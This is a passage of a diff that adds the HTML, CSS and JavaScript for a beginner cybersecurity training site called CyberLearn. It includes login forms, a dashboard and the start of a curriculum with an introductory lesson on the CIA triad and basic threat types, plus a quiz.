@@ -1,0 +1,1263 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CyberLearn — Cybersecurity Training</title>
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=DM+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#0a0e1a;
+  --surface:#111827;
+  --surface2:#1a2235;
+  --border:#1f2d45;
+  --accent:#00f5a0;
+  --accent2:#00d4ff;
+  --accent3:#ff6b35;
+  --text:#e2e8f0;
+  --muted:#64748b;
+  --red:#ef4444;
+  --yellow:#f59e0b;
+  --green:#10b981;
+  --purple:#8b5cf6;
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+body{font-family:'DM Sans',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden;}
+
+/* ── ANIMATED BG ── */
+body::before{content:'';position:fixed;inset:0;background:
+  radial-gradient(ellipse at 20% 50%, rgba(0,245,160,.04) 0%, transparent 60%),
+  radial-gradient(ellipse at 80% 20%, rgba(0,212,255,.04) 0%, transparent 60%);
+  pointer-events:none;z-index:0;}
+
+/* ── AUTH ── */
+.auth-screen{position:fixed;inset:0;background:var(--bg);display:flex;align-items:center;justify-content:center;z-index:1000;}
+.auth-screen.hidden{display:none;}
+.auth-card{width:420px;max-width:95vw;background:var(--surface);border:1px solid var(--border);border-radius:16px;overflow:hidden;box-shadow:0 0 60px rgba(0,245,160,.08);}
+.auth-header{padding:2rem;text-align:center;border-bottom:1px solid var(--border);position:relative;overflow:hidden;}
+.auth-header::before{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(0,245,160,.08),rgba(0,212,255,.05));pointer-events:none;}
+.auth-logo{font-family:'Space Mono',monospace;font-size:1.5rem;color:var(--accent);margin-bottom:.25rem;}
+.auth-logo span{color:var(--accent2);}
+.auth-sub{font-size:.78rem;color:var(--muted);text-transform:uppercase;letter-spacing:2px;}
+.auth-body{padding:1.75rem;}
+.auth-tabs{display:flex;background:var(--bg);border-radius:8px;padding:.25rem;margin-bottom:1.25rem;gap:.25rem;}
+.auth-tab{flex:1;padding:.5rem;text-align:center;font-size:.8rem;font-weight:600;color:var(--muted);cursor:pointer;border-radius:6px;transition:all .2s;}
+.auth-tab.active{background:var(--surface2);color:var(--accent);border:1px solid var(--border);}
+.auth-panel{display:none;}.auth-panel.active{display:block;}
+.field{margin-bottom:1rem;}
+.field label{display:block;font-size:.72rem;font-weight:600;text-transform:uppercase;letter-spacing:.8px;color:var(--muted);margin-bottom:.4rem;}
+.field input{width:100%;padding:.65rem .9rem;background:var(--bg);border:1.5px solid var(--border);border-radius:8px;color:var(--text);font-family:'DM Sans',sans-serif;font-size:.9rem;outline:none;transition:border-color .2s;}
+.field input:focus{border-color:var(--accent);}
+.auth-err{font-size:.78rem;color:var(--red);min-height:1rem;margin-bottom:.75rem;}
+.auth-ok{font-size:.78rem;color:var(--green);min-height:1rem;margin-bottom:.75rem;}
+.auth-btn{width:100%;padding:.7rem;background:var(--accent);color:#0a0e1a;border:none;border-radius:8px;font-family:'DM Sans',sans-serif;font-weight:700;font-size:.95rem;cursor:pointer;transition:all .2s;letter-spacing:.3px;}
+.auth-btn:hover{background:#00d4a0;box-shadow:0 0 20px rgba(0,245,160,.3);}
+.auth-btn:disabled{background:var(--muted);cursor:not-allowed;box-shadow:none;}
+.auth-note{font-size:.72rem;color:var(--muted);text-align:center;margin-top:.85rem;line-height:1.5;}
+
+/* ── TOPBAR ── */
+.topbar{background:var(--surface);border-bottom:1px solid var(--border);height:56px;display:flex;align-items:center;justify-content:space-between;padding:0 1.5rem;position:sticky;top:0;z-index:200;box-shadow:0 2px 20px rgba(0,0,0,.3);}
+.topbar-logo{font-family:'Space Mono',monospace;font-size:1.1rem;color:var(--accent);}
+.topbar-logo span{color:var(--accent2);}
+.topbar-right{display:flex;align-items:center;gap:1rem;}
+.xp-bar-wrap{display:flex;align-items:center;gap:.5rem;}
+.xp-label{font-size:.72rem;color:var(--muted);font-family:'Space Mono',monospace;}
+.xp-bar{width:80px;height:6px;background:var(--border);border-radius:10px;overflow:hidden;}
+.xp-fill{height:100%;background:linear-gradient(90deg,var(--accent),var(--accent2));border-radius:10px;transition:width .5s ease;}
+.level-badge{background:var(--surface2);border:1px solid var(--accent);color:var(--accent);font-family:'Space Mono',monospace;font-size:.7rem;padding:.2rem .6rem;border-radius:20px;}
+.profile-btn{display:flex;align-items:center;gap:.5rem;background:var(--surface2);border:1px solid var(--border);border-radius:8px;padding:.3rem .75rem;cursor:pointer;color:var(--text);font-size:.8rem;font-weight:600;transition:all .18s;}
+.profile-btn:hover{border-color:var(--accent);color:var(--accent);}
+.avatar{width:26px;height:26px;border-radius:50%;background:linear-gradient(135deg,var(--accent),var(--accent2));display:flex;align-items:center;justify-content:center;font-size:.7rem;font-weight:700;color:#0a0e1a;}
+
+/* ── LAYOUT ── */
+.app{display:flex;min-height:calc(100vh - 56px);position:relative;z-index:1;}
+
+/* ── SIDEBAR ── */
+.sidebar{width:240px;background:var(--surface);border-right:1px solid var(--border);flex-shrink:0;padding:1rem 0;overflow-y:auto;}
+.sidebar-section{padding:.35rem 1rem;font-size:.65rem;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;color:var(--muted);margin-top:.75rem;}
+.nav-item{display:flex;align-items:center;gap:.65rem;padding:.6rem 1rem;cursor:pointer;font-size:.85rem;color:var(--muted);transition:all .18s;border-left:3px solid transparent;position:relative;}
+.nav-item:hover{color:var(--text);background:rgba(255,255,255,.03);}
+.nav-item.active{color:var(--accent);border-left-color:var(--accent);background:rgba(0,245,160,.05);}
+.nav-item .icon{font-size:1rem;width:20px;text-align:center;}
+.nav-badge{margin-left:auto;background:var(--accent);color:#0a0e1a;font-size:.6rem;font-weight:700;padding:.1rem .4rem;border-radius:10px;font-family:'Space Mono',monospace;}
+.nav-badge.done{background:var(--green);}
+.nav-badge.locked{background:var(--border);color:var(--muted);}
+
+/* ── MAIN CONTENT ── */
+.content{flex:1;padding:1.75rem;overflow-y:auto;}
+.page{display:none;}.page.active{display:block;}
+
+/* ── DASHBOARD ── */
+.dash-welcome{margin-bottom:1.75rem;}
+.dash-welcome h1{font-family:'Space Mono',monospace;font-size:1.5rem;color:var(--text);margin-bottom:.3rem;}
+.dash-welcome h1 span{color:var(--accent);}
+.dash-welcome p{font-size:.875rem;color:var(--muted);}
+.stats-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:1rem;margin-bottom:1.75rem;}
+.stat-card{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:1rem 1.25rem;position:relative;overflow:hidden;}
+.stat-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;}
+.stat-card.green::before{background:var(--green);}
+.stat-card.blue::before{background:var(--accent2);}
+.stat-card.orange::before{background:var(--accent3);}
+.stat-card.purple::before{background:var(--purple);}
+.stat-label{font-size:.68rem;text-transform:uppercase;letter-spacing:1px;color:var(--muted);font-weight:600;margin-bottom:.4rem;}
+.stat-value{font-family:'Space Mono',monospace;font-size:1.6rem;color:var(--text);}
+.stat-sub{font-size:.72rem;color:var(--muted);margin-top:.2rem;}
+
+/* ── MODULE CARDS ── */
+.modules-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:1rem;}
+.module-card{background:var(--surface);border:1px solid var(--border);border-radius:12px;overflow:hidden;cursor:pointer;transition:all .25s;position:relative;}
+.module-card:hover{border-color:var(--accent);transform:translateY(-2px);box-shadow:0 8px 30px rgba(0,245,160,.08);}
+.module-card.locked{opacity:.5;cursor:not-allowed;}
+.module-card.locked:hover{transform:none;border-color:var(--border);box-shadow:none;}
+.module-card.completed{border-color:var(--green);}
+.module-top{padding:1.25rem;border-bottom:1px solid var(--border);}
+.module-icon{font-size:2rem;margin-bottom:.65rem;}
+.module-title{font-weight:700;font-size:.95rem;margin-bottom:.3rem;color:var(--text);}
+.module-desc{font-size:.78rem;color:var(--muted);line-height:1.5;}
+.module-bottom{padding:.75rem 1.25rem;display:flex;align-items:center;justify-content:space-between;}
+.module-meta{font-size:.72rem;color:var(--muted);}
+.module-status{font-size:.7rem;font-weight:700;padding:.2rem .6rem;border-radius:4px;font-family:'Space Mono',monospace;}
+.ms-new{background:rgba(0,245,160,.1);color:var(--accent);border:1px solid rgba(0,245,160,.2);}
+.ms-done{background:rgba(16,185,129,.1);color:var(--green);border:1px solid rgba(16,185,129,.2);}
+.ms-lock{background:var(--border);color:var(--muted);}
+.module-progress{height:3px;background:var(--border);margin-top:.65rem;}
+.module-progress-fill{height:100%;background:linear-gradient(90deg,var(--accent),var(--accent2));transition:width .4s;}
+
+/* ── LESSON VIEW ── */
+.lesson-header{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:1.25rem 1.5rem;margin-bottom:1.25rem;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:1rem;}
+.lesson-breadcrumb{font-size:.75rem;color:var(--muted);margin-bottom:.3rem;}
+.lesson-breadcrumb span{color:var(--accent);}
+.lesson-title{font-family:'Space Mono',monospace;font-size:1.1rem;color:var(--text);}
+.lesson-body{display:grid;grid-template-columns:1fr 300px;gap:1.25rem;}
+.lesson-main{display:flex;flex-direction:column;gap:1.25rem;}
+.lesson-card{background:var(--surface);border:1px solid var(--border);border-radius:12px;overflow:hidden;}
+.lesson-card-head{padding:.85rem 1.25rem;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:.5rem;font-weight:700;font-size:.875rem;}
+.lesson-card-body{padding:1.25rem;}
+.lesson-text{font-size:.875rem;line-height:1.8;color:var(--text);}
+.lesson-text h3{font-family:'Space Mono',monospace;color:var(--accent);font-size:.9rem;margin:1rem 0 .4rem;}
+.lesson-text p{margin-bottom:.75rem;}
+.lesson-text ul{margin:.5rem 0 .75rem 1.25rem;}
+.lesson-text li{margin-bottom:.3rem;}
+.code-block{background:#0d1117;border:1px solid var(--border);border-radius:8px;padding:1rem;font-family:'Space Mono',monospace;font-size:.78rem;color:#a5f3a0;line-height:1.6;overflow-x:auto;margin:.75rem 0;}
+.tip-box{background:rgba(0,212,255,.05);border:1px solid rgba(0,212,255,.2);border-radius:8px;padding:.85rem 1rem;font-size:.82rem;color:var(--accent2);margin:.75rem 0;display:flex;gap:.65rem;}
+.warn-box{background:rgba(255,107,53,.05);border:1px solid rgba(255,107,53,.2);border-radius:8px;padding:.85rem 1rem;font-size:.82rem;color:var(--accent3);margin:.75rem 0;display:flex;gap:.65rem;}
+.video-wrap{position:relative;padding-bottom:56.25%;height:0;border-radius:8px;overflow:hidden;background:#000;}
+.video-wrap iframe{position:absolute;inset:0;width:100%;height:100%;}
+
+/* ── SIDEBAR LESSON NAV ── */
+.lesson-nav-card{background:var(--surface);border:1px solid var(--border);border-radius:12px;overflow:hidden;position:sticky;top:1rem;}
+.lesson-nav-head{padding:.85rem 1rem;border-bottom:1px solid var(--border);font-weight:700;font-size:.8rem;color:var(--muted);text-transform:uppercase;letter-spacing:.5px;}
+.lesson-nav-item{display:flex;align-items:center;gap:.65rem;padding:.6rem 1rem;cursor:pointer;font-size:.8rem;color:var(--muted);transition:all .18s;border-left:2px solid transparent;}
+.lesson-nav-item:hover{color:var(--text);background:rgba(255,255,255,.02);}
+.lesson-nav-item.active{color:var(--accent);border-left-color:var(--accent);background:rgba(0,245,160,.04);}
+.lesson-nav-item.done{color:var(--green);}
+.lesson-check{width:16px;height:16px;border-radius:50%;border:1.5px solid var(--border);flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:.6rem;}
+.lesson-check.done{background:var(--green);border-color:var(--green);color:#fff;}
+.lesson-check.active{border-color:var(--accent);}
+
+/* ── QUIZ ── */
+.quiz-wrap{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:1.5rem;}
+.quiz-q{font-weight:700;font-size:.95rem;margin-bottom:1rem;line-height:1.5;}
+.quiz-q .qnum{font-family:'Space Mono',monospace;color:var(--accent);font-size:.75rem;display:block;margin-bottom:.3rem;}
+.quiz-options{display:flex;flex-direction:column;gap:.6rem;}
+.quiz-opt{padding:.75rem 1rem;background:var(--bg);border:1.5px solid var(--border);border-radius:8px;cursor:pointer;font-size:.875rem;transition:all .2s;display:flex;align-items:center;gap:.75rem;}
+.quiz-opt:hover{border-color:var(--accent2);background:rgba(0,212,255,.04);}
+.quiz-opt.selected{border-color:var(--accent);background:rgba(0,245,160,.06);}
+.quiz-opt.correct{border-color:var(--green);background:rgba(16,185,129,.08);color:var(--green);}
+.quiz-opt.wrong{border-color:var(--red);background:rgba(239,68,68,.06);color:var(--red);}
+.quiz-opt-letter{width:24px;height:24px;border-radius:6px;background:var(--border);display:flex;align-items:center;justify-content:center;font-family:'Space Mono',monospace;font-size:.7rem;font-weight:700;flex-shrink:0;}
+.quiz-feedback{margin-top:1rem;padding:.85rem 1rem;border-radius:8px;font-size:.82rem;display:none;}
+.quiz-feedback.show{display:block;}
+.quiz-feedback.correct{background:rgba(16,185,129,.08);border:1px solid rgba(16,185,129,.2);color:var(--green);}
+.quiz-feedback.wrong{background:rgba(239,68,68,.06);border:1px solid rgba(239,68,68,.2);color:var(--red);}
+.quiz-progress{display:flex;gap:.35rem;margin-bottom:1.25rem;}
+.qp-dot{width:8px;height:8px;border-radius:50%;background:var(--border);transition:background .3s;}
+.qp-dot.done{background:var(--green);}
+.qp-dot.active{background:var(--accent);}
+.quiz-result{text-align:center;padding:2rem;}
+.quiz-result .score{font-family:'Space Mono',monospace;font-size:3rem;margin-bottom:.5rem;}
+.quiz-result .score.pass{color:var(--green);}
+.quiz-result .score.fail{color:var(--red);}
+
+/* ── CHALLENGE ── */
+.challenge-card{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:1.25rem;margin-bottom:1rem;}
+.challenge-title{font-family:'Space Mono',monospace;font-size:.9rem;color:var(--accent);margin-bottom:.5rem;}
+.challenge-desc{font-size:.82rem;color:var(--muted);line-height:1.6;margin-bottom:1rem;}
+.challenge-input{width:100%;padding:.65rem .9rem;background:var(--bg);border:1.5px solid var(--border);border-radius:8px;color:var(--text);font-family:'Space Mono',monospace;font-size:.85rem;outline:none;margin-bottom:.65rem;}
+.challenge-input:focus{border-color:var(--accent);}
+.challenge-hint{font-size:.75rem;color:var(--muted);margin-bottom:.65rem;cursor:pointer;display:flex;align-items:center;gap:.35rem;}
+.challenge-hint-text{display:none;background:rgba(245,158,11,.06);border:1px solid rgba(245,158,11,.2);border-radius:6px;padding:.6rem .85rem;font-size:.78rem;color:var(--yellow);margin-bottom:.65rem;}
+.challenge-hint-text.show{display:block;}
+.diff-badge{display:inline-flex;align-items:center;padding:.18rem .6rem;border-radius:4px;font-size:.65rem;font-weight:700;text-transform:uppercase;letter-spacing:.5px;margin-bottom:.65rem;}
+.diff-easy{background:rgba(16,185,129,.1);color:var(--green);border:1px solid rgba(16,185,129,.2);}
+.diff-medium{background:rgba(245,158,11,.1);color:var(--yellow);border:1px solid rgba(245,158,11,.2);}
+.diff-hard{background:rgba(239,68,68,.1);color:var(--red);border:1px solid rgba(239,68,68,.2);}
+
+/* ── BUTTONS ── */
+.btn{padding:.5rem 1.1rem;border-radius:8px;border:none;cursor:pointer;font-family:'DM Sans',sans-serif;font-weight:600;font-size:.85rem;display:inline-flex;align-items:center;gap:.4rem;transition:all .2s;white-space:nowrap;}
+.btn-primary{background:var(--accent);color:#0a0e1a;}.btn-primary:hover{background:#00d4a0;box-shadow:0 0 15px rgba(0,245,160,.25);}
+.btn-secondary{background:var(--surface2);color:var(--text);border:1px solid var(--border);}.btn-secondary:hover{border-color:var(--accent);color:var(--accent);}
+.btn-ghost{background:transparent;color:var(--muted);border:1px solid var(--border);}.btn-ghost:hover{color:var(--text);border-color:var(--muted);}
+.btn-sm{padding:.3rem .75rem;font-size:.78rem;}
+
+/* ── PROGRESS PAGE ── */
+.progress-section{margin-bottom:1.75rem;}
+.progress-section h2{font-family:'Space Mono',monospace;font-size:.95rem;color:var(--accent);margin-bottom:1rem;}
+.progress-module{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:1rem 1.25rem;margin-bottom:.65rem;display:flex;align-items:center;gap:1rem;}
+.progress-module-icon{font-size:1.4rem;width:36px;text-align:center;}
+.progress-module-info{flex:1;}
+.progress-module-name{font-weight:600;font-size:.875rem;margin-bottom:.3rem;}
+.progress-bar{height:6px;background:var(--border);border-radius:10px;overflow:hidden;}
+.progress-fill{height:100%;background:linear-gradient(90deg,var(--accent),var(--accent2));border-radius:10px;transition:width .6s ease;}
+.progress-pct{font-family:'Space Mono',monospace;font-size:.75rem;color:var(--muted);width:36px;text-align:right;}
+
+/* ── LOADING ── */
+.loading-overlay{position:fixed;inset:0;background:var(--bg);display:flex;align-items:center;justify-content:center;z-index:900;}
+.loading-overlay.hidden{display:none;}
+.loading-content{text-align:center;}
+.loading-logo{font-family:'Space Mono',monospace;font-size:1.5rem;color:var(--accent);margin-bottom:1rem;}
+.loading-logo span{color:var(--accent2);}
+.spinner{width:32px;height:32px;border:2px solid var(--border);border-top-color:var(--accent);border-radius:50%;animation:spin .7s linear infinite;margin:0 auto .75rem;}
+@keyframes spin{to{transform:rotate(360deg);}}
+.loading-content p{font-size:.8rem;color:var(--muted);}
+
+@media(max-width:900px){
+  .sidebar{display:none;}
+  .lesson-body{grid-template-columns:1fr;}
+  .stats-grid{grid-template-columns:1fr 1fr;}
+}
+</style>
+</head>
+<body>
+
+<!-- LOADING -->
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="loading-content">
+    <div class="loading-logo">Cyber<span>Learn</span></div>
+    <div class="spinner"></div>
+    <p id="loadingMsg">Initializing…</p>
+  </div>
+</div>
+
+<!-- AUTH -->
+<div class="auth-screen" id="authScreen">
+  <div class="auth-card">
+    <div class="auth-header">
+      <div class="auth-logo">Cyber<span>Learn</span></div>
+      <div class="auth-sub">Cybersecurity Training Platform</div>
+    </div>
+    <div class="auth-body">
+      <div class="auth-tabs">
+        <div class="auth-tab active" onclick="showAuthTab('login')">Sign In</div>
+        <div class="auth-tab" onclick="showAuthTab('signup')">Sign Up</div>
+        <div class="auth-tab" onclick="showAuthTab('reset')">Reset</div>
+      </div>
+      <!-- LOGIN -->
+      <div class="auth-panel active" id="panel-login">
+        <div class="field"><label>Email</label><input type="email" id="l-email" placeholder="your@email.com" onkeydown="if(event.key==='Enter')doLogin()"></div>
+        <div class="field"><label>Password</label><input type="password" id="l-pw" placeholder="Your password" onkeydown="if(event.key==='Enter')doLogin()"></div>
+        <div class="auth-err" id="l-err"></div>
+        <button class="auth-btn" id="l-btn" onclick="doLogin()">→ Sign In</button>
+      </div>
+      <!-- SIGNUP -->
+      <div class="auth-panel" id="panel-signup">
+        <div class="field"><label>Full Name</label><input type="text" id="s-name" placeholder="Your name"></div>
+        <div class="field"><label>Email</label><input type="email" id="s-email" placeholder="your@email.com"></div>
+        <div class="field"><label>Password</label><input type="password" id="s-pw" placeholder="Min 8 characters"></div>
+        <div class="field"><label>Confirm Password</label><input type="password" id="s-pw2" placeholder="Repeat password"></div>
+        <div class="auth-err" id="s-err"></div>
+        <div class="auth-ok" id="s-ok"></div>
+        <button class="auth-btn" id="s-btn" onclick="doSignup()">→ Create Account</button>
+      </div>
+      <!-- RESET -->
+      <div class="auth-panel" id="panel-reset">
+        <div class="field"><label>Email</label><input type="email" id="r-email" placeholder="your@email.com"></div>
+        <div class="auth-err" id="r-err"></div>
+        <div class="auth-ok" id="r-ok"></div>
+        <button class="auth-btn" id="r-btn" onclick="doReset()">→ Send Reset Link</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- TOPBAR -->
+<div class="topbar">
+  <div class="topbar-logo">Cyber<span>Learn</span></div>
+  <div class="topbar-right">
+    <div class="xp-bar-wrap">
+      <span class="xp-label" id="xpLabel">0 XP</span>
+      <div class="xp-bar"><div class="xp-fill" id="xpFill" style="width:0%"></div></div>
+    </div>
+    <div class="level-badge" id="levelBadge">LVL 0</div>
+    <div class="profile-btn" onclick="switchPage('progress')">
+      <div class="avatar" id="topAvatar">?</div>
+      <span id="topName">Account</span>
+    </div>
+  </div>
+</div>
+
+<!-- APP -->
+<div class="app">
+  <!-- SIDEBAR -->
+  <div class="sidebar">
+    <div class="sidebar-section">Navigation</div>
+    <div class="nav-item active" data-page="dashboard" onclick="switchPage('dashboard')"><span class="icon">🏠</span> Dashboard</div>
+    <div class="nav-item" data-page="progress" onclick="switchPage('progress')"><span class="icon">📊</span> My Progress</div>
+
+    <div class="sidebar-section">Modules</div>
+    <div class="nav-item" data-page="m0" onclick="openModule(0)"><span class="icon">🔐</span> Intro to CyberSec <span class="nav-badge" id="nb0">NEW</span></div>
+    <div class="nav-item" data-page="m1" onclick="openModule(1)"><span class="icon">🌐</span> Networking Basics <span class="nav-badge" id="nb1">NEW</span></div>
+    <div class="nav-item" data-page="m2" onclick="openModule(2)"><span class="icon">🐧</span> Linux for Security <span class="nav-badge" id="nb2">NEW</span></div>
+    <div class="nav-item" data-page="m3" onclick="openModule(3)"><span class="icon">🔑</span> Cryptography <span class="nav-badge" id="nb3">NEW</span></div>
+    <div class="nav-item" data-page="m4" onclick="openModule(4)"><span class="icon">🎭</span> Social Engineering <span class="nav-badge" id="nb4">NEW</span></div>
+    <div class="nav-item" data-page="m5" onclick="openModule(5)"><span class="icon">🌍</span> Web Security <span class="nav-badge" id="nb5">NEW</span></div>
+
+    <div class="sidebar-section">Practice</div>
+    <div class="nav-item" data-page="challenges" onclick="switchPage('challenges')"><span class="icon">⚡</span> Challenges</div>
+  </div>
+
+  <!-- CONTENT -->
+  <div class="content">
+
+    <!-- DASHBOARD -->
+    <div class="page active" id="page-dashboard">
+      <div class="dash-welcome">
+        <h1>Welcome back, <span id="dashName">Hacker</span> 👾</h1>
+        <p>Continue your cybersecurity journey. You're doing great!</p>
+      </div>
+      <div class="stats-grid">
+        <div class="stat-card green"><div class="stat-label">Modules Completed</div><div class="stat-value" id="st-modules">0/6</div><div class="stat-sub">Keep going!</div></div>
+        <div class="stat-card blue"><div class="stat-label">Quizzes Passed</div><div class="stat-value" id="st-quizzes">0</div><div class="stat-sub">Test your knowledge</div></div>
+        <div class="stat-card orange"><div class="stat-label">Challenges Solved</div><div class="stat-value" id="st-challenges">0</div><div class="stat-sub">Hands-on practice</div></div>
+        <div class="stat-card purple"><div class="stat-label">Total XP</div><div class="stat-value" id="st-xp">0</div><div class="stat-sub">Experience points</div></div>
+      </div>
+      <h2 style="font-family:'Space Mono',monospace;font-size:.95rem;color:var(--accent);margin-bottom:1rem;">📚 All Modules</h2>
+      <div class="modules-grid" id="modulesGrid"></div>
+    </div>
+
+    <!-- MODULE LESSON PAGE -->
+    <div class="page" id="page-module">
+      <div class="lesson-header">
+        <div>
+          <div class="lesson-breadcrumb">Modules → <span id="lessonModuleTitle">—</span></div>
+          <div class="lesson-title" id="lessonTitle">—</div>
+        </div>
+        <div style="display:flex;gap:.65rem;">
+          <button class="btn btn-ghost btn-sm" onclick="switchPage('dashboard')">← Back</button>
+          <button class="btn btn-primary btn-sm" id="nextLessonBtn" onclick="nextLesson()">Next →</button>
+        </div>
+      </div>
+      <div class="lesson-body">
+        <div class="lesson-main" id="lessonMain"></div>
+        <div>
+          <div class="lesson-nav-card">
+            <div class="lesson-nav-head">Module Contents</div>
+            <div id="lessonNavList"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- CHALLENGES PAGE -->
+    <div class="page" id="page-challenges">
+      <div style="margin-bottom:1.5rem;">
+        <h1 style="font-family:'Space Mono',monospace;font-size:1.2rem;color:var(--text);margin-bottom:.3rem;">⚡ Challenges</h1>
+        <p style="font-size:.85rem;color:var(--muted);">Solve real-world cybersecurity challenges. Each correct answer earns XP.</p>
+      </div>
+      <div id="challengesList"></div>
+    </div>
+
+    <!-- PROGRESS PAGE -->
+    <div class="page" id="page-progress">
+      <div style="margin-bottom:1.5rem;">
+        <h1 style="font-family:'Space Mono',monospace;font-size:1.2rem;color:var(--text);margin-bottom:.3rem;">📊 My Progress</h1>
+        <p style="font-size:.85rem;color:var(--muted);">Track your cybersecurity learning journey.</p>
+      </div>
+      <div class="stats-grid" style="margin-bottom:1.75rem;">
+        <div class="stat-card green"><div class="stat-label">Total XP</div><div class="stat-value" id="pr-xp">0</div></div>
+        <div class="stat-card blue"><div class="stat-label">Level</div><div class="stat-value" id="pr-level">0</div></div>
+        <div class="stat-card orange"><div class="stat-label">Quizzes Passed</div><div class="stat-value" id="pr-quizzes">0</div></div>
+        <div class="stat-card purple"><div class="stat-label">Challenges Done</div><div class="stat-value" id="pr-challenges">0</div></div>
+      </div>
+      <div class="progress-section">
+        <h2>Module Progress</h2>
+        <div id="progressModules"></div>
+      </div>
+      <div style="margin-top:1.5rem;">
+        <button class="btn btn-ghost" onclick="doLogout()">🚪 Sign Out</button>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<script>
+// ══════════════════════════════════════════════
+// CONFIG
+// ══════════════════════════════════════════════
+const SB_URL = 'https://dgnzmzwmdlshvvnbzkvx.supabase.co';
+const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRnbnptendtZGxzaHZ2bmJ6a3Z4Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzE0OTI4MzgsImV4cCI6MjA4NzA2ODgzOH0.PwEyYwR7dfoppGPk0qQ8B361ayOFKoi9XK5IVn-b7ds';
+
+// ══════════════════════════════════════════════
+// CURRICULUM DATA
+// ══════════════════════════════════════════════
+const MODULES = [
+  {
+    id:'m0', icon:'🔐', title:'Intro to Cybersecurity', desc:'Understand what cybersecurity is, why it matters, and the key concepts every beginner needs to know.',
+    lessons:[
+      {
+        id:'m0l0', title:'What is Cybersecurity?',
+        content:`<div class="lesson-text">
+          <h3>// What is Cybersecurity?</h3>
+          <p>Cybersecurity is the practice of protecting computers, networks, programs and data from digital attacks, damage or unauthorized access. Think of it as the digital equivalent of locks, guards and alarm systems — but for your data.</p>
+          <div class="tip-box">💡 <div>The global cybersecurity market is worth over <strong>$200 billion</strong> and is one of the fastest growing fields in tech. Skills in this area are in extremely high demand.</div></div>
+          <h3>// The CIA Triad</h3>
+          <p>All of cybersecurity revolves around three core principles:</p>
+          <ul>
+            <li><strong style="color:var(--accent)">Confidentiality</strong> — Only authorized people can access information</li>
+            <li><strong style="color:var(--accent2)">Integrity</strong> — Information is accurate and hasn't been tampered with</li>
+            <li><strong style="color:var(--accent3)">Availability</strong> — Systems and data are accessible when needed</li>
+          </ul>
+          <h3>// Types of Threats</h3>
+          <ul>
+            <li><strong>Malware</strong> — malicious software (viruses, ransomware, spyware)</li>
+            <li><strong>Phishing</strong> — tricking people into revealing sensitive info</li>
+            <li><strong>Man-in-the-Middle</strong> — intercepting communications</li>
+            <li><strong>DDoS</strong> — overwhelming a system with traffic to make it unavailable</li>
+            <li><strong>SQL Injection</strong> — attacking databases via input fields</li>
+          </ul>
+          <div class="warn-box">⚠️ <div>Cybercrime costs the global economy over <strong>$8 trillion per year</strong>. Understanding these threats is the first step to fighting them.</div></div>
+          <h3>// Risk, Vulnerability & Threat</h3>
+          <ul>
+            <li><strong>Vulnerability</strong> — A weakness in a system (e.g. unpatched software)</li>
+            <li><strong>Threat</strong> — Something that could exploit a vulnerability (e.g. a hacker)</li>
+            <li><strong>Risk</strong> — The potential damage if a threat exploits a vulnerability</li>
+          </ul>
+        </div>`,
+        video:'https://www.youtube.com/embed/inWWhr5tnEA',
+        quiz:[
+          {q:'What does the "I" in the CIA Triad stand for?',opts:['Intelligence','Integrity','Integration','Interoperability'],correct:1,exp:'Integrity means information is accurate and has not been tampered with.',trick:false},
+          {q:'A DDoS attack is mainly designed to:',opts:['Steal passwords','Make a system unavailable by overwhelming it','Install malware','Intercept communications'],correct:1,exp:'DDoS (Distributed Denial of Service) floods a system with traffic to make it unavailable.',trick:false},
+          {q:'TRICK: Confidentiality in the CIA Triad means data is always available to everyone.',opts:['True','False'],correct:1,exp:'FALSE. Confidentiality means ONLY authorized people can access data — the opposite of everyone.',trick:true},
+          {q:'What is a vulnerability?',opts:['A type of malware','A hacker tool','A weakness in a system that could be exploited','A strong firewall'],correct:2,exp:'A vulnerability is a weakness or flaw in a system that could be exploited by a threat.',trick:false},
+          {q:'Which of these is an example of a threat?',opts:['Unpatched software','An open port','A hacker attempting to break in','A weak password policy'],correct:2,exp:'A threat is an actor or event that could exploit a vulnerability. An unpatched software is a vulnerability.',trick:false},
+          {q:'TRICK: A system with no vulnerabilities has no risk.',opts:['True','False'],correct:1,exp:'FALSE. Even systems with no known vulnerabilities face risk from unknown (zero-day) vulnerabilities and insider threats.',trick:true},
+          {q:'What does "Availability" in the CIA Triad mean?',opts:['Data is encrypted','Data is only for admins','Systems and data are accessible when needed','Data cannot be modified'],correct:2,exp:'Availability ensures that systems and data are accessible to authorized users when they need them.',trick:false},
+          {q:'Which attack type involves tricking people into revealing their passwords?',opts:['DDoS','SQL Injection','Man-in-the-Middle','Phishing'],correct:3,exp:'Phishing tricks people into revealing sensitive information like passwords through fake emails or websites.',trick:false},
+          {q:'TRICK: Cybersecurity is only about protecting against external attacks.',opts:['True','False'],correct:1,exp:'FALSE. Insider threats (employees, contractors) are one of the biggest cybersecurity risks. Security must protect against both internal and external threats.',trick:true},
+          {q:'What is the correct order of: Vulnerability, Threat, Risk?',opts:['Threat exploits Vulnerability to create Risk','Risk exploits Vulnerability to create Threat','Vulnerability exploits Threat to create Risk','Risk exploits Threat to create Vulnerability'],correct:0,exp:'A Threat exploits a Vulnerability which creates a Risk of damage or loss.',trick:false},
